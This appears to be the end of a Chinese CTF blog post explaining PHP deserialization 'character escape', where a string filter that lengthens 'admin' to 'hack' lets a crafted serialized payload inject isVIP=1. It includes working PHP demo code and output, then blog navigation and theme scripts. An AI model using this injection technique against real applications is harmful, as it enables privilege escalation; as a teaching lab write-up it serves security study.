+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;<span class="keyword">public</span> <span class="variable">$username</span>;<span class="keyword">public</span> <span class="variable">$password</span>;<span class="keyword">public</span> <span class="variable">$isVIP</span>;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;<span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;<span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;<span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>; &#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;<span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hack&quot;</span>,<span class="variable">$s</span>);&#125;<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;</span>,<span class="string">&#x27;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>);<span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);<span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);<span class="keyword">echo</span> <span class="variable">$a_seri_filter</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:105:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>仔细观察这一串字符串可以看到紫色方框内一共107个字符，但是前面只有显示105,造成这种现象的原因是：替换之前我们目标子串的位置是123456，一共6个字符，替换之后我们的目标子串显然超过10个字符，所以会造成计算得到的payload不准确</p>
+<p>解决办法是：多添加2个admin，这样就可以补上缺少的字符。</p>
+<p>修改后代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hack&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;</span>,<span class="string">&#x27;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri_filter</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:115:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>分析输出结果,可以看到，这一下就对了。<br>我们将对象反序列化然后输出，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hack&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;</span>,<span class="string">&#x27;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line"><span class="variable">$a_seri_filter_unseri</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a_seri_filter</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a_seri_filter_unseri</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">object(user)#2 (3) &#123;</span><br><span class="line">  [&quot;username&quot;]=&gt;</span><br><span class="line">string(115) &quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;</span><br><span class="line">  [&quot;password&quot;]=&gt;</span><br><span class="line">string(6) &quot;123456&quot;</span><br><span class="line">  [&quot;isVIP&quot;]=&gt;</span><br><span class="line">int(1)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到，这个时候isVIP的值也为1，也就达到了我们反序列化字符逃逸的目的了<br>————————————————<br>版权声明：本文为CSDN博主「合天网安实验室」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/119901933">https://blog.csdn.net/qq_38154820/article/details/119901933</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://musewithwind.gitee.io">zha0fe1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://musewithwind.gitee.io/2022/12/02/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://musewithwind.gitee.io/2022/12/02/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://musewithwind.gitee.io" target="_blank">暮色随风</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/PHP/">PHP</a></div><div class="post_share"><div class="social-share" data-image="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/hacker.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/12/02/SQL%E6%B3%A8%E5%85%A5/"><img class="prev-cover" src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/hacker.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">SQL注入</div></div></a></div><div class="next-post pull-right"><a href="/2022/11/29/CTF%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7/"><img class="next-cover" src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com//ctf.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CTF在线工具</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/11/29/CTF%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7/" title="CTF在线工具"><img class="cover" src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com//ctf.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-29</div><div class="title">CTF在线工具</div></div></a></div><div><a href="/2022/11/29/CTF%E4%BC%98%E8%B4%A8%E5%8D%9A%E5%AE%A2/" title="CTF优质博客"><img class="cover" src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com//ctf.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-29</div><div class="title">CTF优质博客</div></div></a></div><div><a href="/2022/11/29/Git%E6%B3%84%E9%9C%B2%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86-%E8%BD%AC%E8%BD%BD/" title="Git泄露相关知识-转载"><img class="cover" src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com//git.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-29</div><div class="title">Git泄露相关知识-转载</div></div></a></div><div><a href="/2022/12/02/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入"><img class="cover" src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/hacker.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-02</div><div class="title">SQL注入</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/touxiang.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">zha0fe1</div><div class="author-info__description">江湖夜雨十年灯</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://m.weibo.cn/u/7713352758?uid=7713352758&amp;t=0&amp;luicode=10000011&amp;lfid=100103type%3D1%26q%3D%E5%AF%B9%E6%8A%97%E6%97%A0%E6%84%8F%E4%B9%89"><i class="fab fa-github"></i><span>More</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:1379887009@qq.com" target="_blank" title="Email"><i class="QQ"></i></a><a class="social-icon" href="https://github.com/suifen" target="_blank" title="Github"><i class="github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">回首向来萧瑟处,归去,也无风雨也无晴</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">1.</span> <span class="toc-text">魔术方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.</span> <span class="toc-text">序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.</span> <span class="toc-text">反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E7%82%B9"><span class="toc-number">3.0.1.</span> <span class="toc-text">特点</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E5%A7%BF%E5%8A%BF"><span class="toc-number">4.</span> <span class="toc-text">解题姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">4.1.</span> <span class="toc-text">绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-wakeup"><span class="toc-number">4.1.1.</span> <span class="toc-text">绕过__wakeup()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0pop%E9%93%BE"><span class="toc-number">4.2.</span> <span class="toc-text">构造pop链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%BE%E5%88%B0%E7%9B%AE%E6%A0%87%E5%87%BD%E6%95%B0"><span class="toc-number">4.2.1.</span> <span class="toc-text">找到目标函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%BE%E5%88%B0%E5%85%A5%E5%8F%A3%E5%87%BD%E6%95%B0"><span class="toc-number">4.2.2.</span> <span class="toc-text">找到入口函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A5%E5%85%A5%E5%8F%A3%E5%87%BD%E6%95%B0%E4%B8%BA%E5%BC%95%E5%AD%90%EF%BC%8C%E6%9E%84%E9%80%A0%E6%95%B4%E6%9D%A1%E9%93%BE%E5%AD%90"><span class="toc-number">4.2.3.</span> <span class="toc-text">以入口函数为引子，构造整条链子</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8"><span class="toc-number">4.3.</span> <span class="toc-text">字符逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%A6%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8"><span class="toc-number">4.3.1.</span> <span class="toc-text">详解PHP反序列化字符逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%90%8E%E5%AD%97%E7%AC%A6%E5%8F%98%E5%A4%9A"><span class="toc-number">4.3.1.1.</span> <span class="toc-text">过滤后字符变多</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%90%8E%E5%AD%97%E7%AC%A6%E5%8F%98%E5%B0%91"><span class="toc-number">4.3.1.2.</span> <span class="toc-text">过滤后字符变少</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/04/20/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%AB%A0%E8%8A%82%E5%A4%8D%E7%9B%98/" title="小迪安全章节复盘"><img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/hacker.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="小迪安全章节复盘"/></a><div class="content"><a class="title" href="/2023/04/20/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%AB%A0%E8%8A%82%E5%A4%8D%E7%9B%98/" title="小迪安全章节复盘">小迪安全章节复盘</a><time datetime="2023-04-20T11:00:00.000Z" title="发表于 2023-04-20 19:00:00">2023-04-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/05/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0/" title="小迪安全"><img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/hacker.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="小迪安全"/></a><div class="content"><a class="title" href="/2023/04/05/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0/" title="小迪安全">小迪安全</a><time datetime="2023-04-04T16:00:00.000Z" title="发表于 2023-04-05 00:00:00">2023-04-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/17/%E5%85%B3%E4%BA%8E%E9%A3%8E%E5%A3%B0/" title="关于风声"><img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/tree.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="关于风声"/></a><div class="content"><a class="title" href="/2023/02/17/%E5%85%B3%E4%BA%8E%E9%A3%8E%E5%A3%B0/" title="关于风声">关于风声</a><time datetime="2023-02-17T11:53:00.000Z" title="发表于 2023-02-17 19:53:00">2023-02-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/12/23/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8A%E7%BA%BF%E5%8D%9A%E5%AE%A2/" title="记一次上线博客"><img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/hexo.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="记一次上线博客"/></a><div class="content"><a class="title" href="/2022/12/23/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8A%E7%BA%BF%E5%8D%9A%E5%AE%A2/" title="记一次上线博客">记一次上线博客</a><time datetime="2022-12-23T03:24:00.000Z" title="发表于 2022-12-23 11:24:00">2022-12-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/12/02/Git/" title="Git"><img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com//git.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Git"/></a><div class="content"><a class="title" href="/2022/12/02/Git/" title="Git">Git</a><time datetime="2022-12-02T09:46:00.000Z" title="发表于 2022-12-02 17:46:00">2022-12-02</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/hacker.webp')"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By zha0fe1</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><div class="aplayer no-destroy" data-id="7839668682" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="false" data-volume="0.5" muted></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="野鹤,纷飞,日暮,不思归" data-fontsize="15px" data-random="false" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
